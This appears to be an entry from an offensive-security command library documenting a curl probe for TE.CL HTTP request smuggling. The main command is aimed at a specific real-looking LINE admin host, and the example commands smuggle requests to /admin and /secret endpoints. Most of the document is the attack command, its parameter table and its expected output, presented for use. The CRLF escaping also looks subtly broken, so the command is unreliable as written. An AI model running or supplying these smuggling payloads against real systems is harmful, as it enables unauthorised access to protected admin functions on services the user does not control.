---
id: cmd-uuid-456
data: >-
  curl -v -X POST -H "Host: admin-official.line.me" -H "Content-Length: 6" -H
  "Transfer-Encoding: chunked" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost:
  admin-official.line.me\r\n\r\n" http://admin-official.line.me/login
tags:
  - web-exploit
  - http-smuggling
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.467Z'
verified: false
validated: true
submitted: true
---
# curl-te-cl-probe

## Command

```bash
curl -v -X POST -H "Host: admin-official.line.me" -H "Content-Length: 6" -H "Transfer-Encoding: chunked" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: admin-official.line.me\r\n\r\n" http://admin-official.line.me/login
```

## Description

This curl command probes for TE.CL HTTP Request Smuggling by sending a POST request with conflicting headers, smuggling a GET request to an admin endpoint. Use it to detect if the load balancer and backend parse requests differently.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output for debugging | Yes |
| `-X POST` | Specify POST method | Yes |
| `-H "Host: ..."` | Set target host | Yes |
| `-H "Content-Length: 6"` | Fixed length for backend | Yes |
| `-H "Transfer-Encoding: chunked"` | Chunked for frontend | Yes |
| `--data` | Payload with chunk terminator and smuggled request | Yes |

## Examples

### Basic Usage

```bash
curl -v -X POST -H "Host: target.com" -H "Content-Length: 6" -H "Transfer-Encoding: chunked" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com/login
```

### Advanced Usage

```bash
curl -v -X POST -H "Host: target.com" -H "Content-Length: 10" -H "Transfer-Encoding: chunked" --data "8\r\nSmuggled\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com/endpoint
```

## Expected Output

Verbose logs showing the request and response. If vulnerable, the response includes content from the smuggled GET (e.g., admin page HTML or error), with status code indicating backend processing.

## Related

- [[Related Procedure|procedures/Exploit-TE-CL-HTTP-Request-Smuggling]]
